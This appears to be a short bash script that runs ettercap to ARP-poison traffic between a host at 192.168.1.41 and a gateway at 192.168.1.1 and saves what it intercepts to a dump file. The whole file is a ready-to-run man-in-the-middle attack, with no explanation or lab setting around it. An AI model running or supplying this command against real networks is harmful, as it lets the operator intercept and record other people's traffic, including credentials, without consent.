#!/bin/bash
echo 
ettercap -Tq -i eth0 -w dump-ettercap -M ARP /192.168.1.41/ /192.168.1.1/
